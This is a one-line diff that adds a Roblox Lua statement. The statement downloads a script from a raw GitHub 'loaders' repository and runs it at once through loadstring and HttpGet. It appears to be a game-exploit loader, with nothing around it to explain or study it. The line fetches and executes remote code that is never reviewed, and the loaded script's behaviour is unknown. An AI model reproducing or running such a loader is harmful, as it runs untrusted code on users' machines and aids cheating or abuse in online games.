@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/kukirin-life-testing-spam6-i01d0ptzgvyi1b.lua"))()
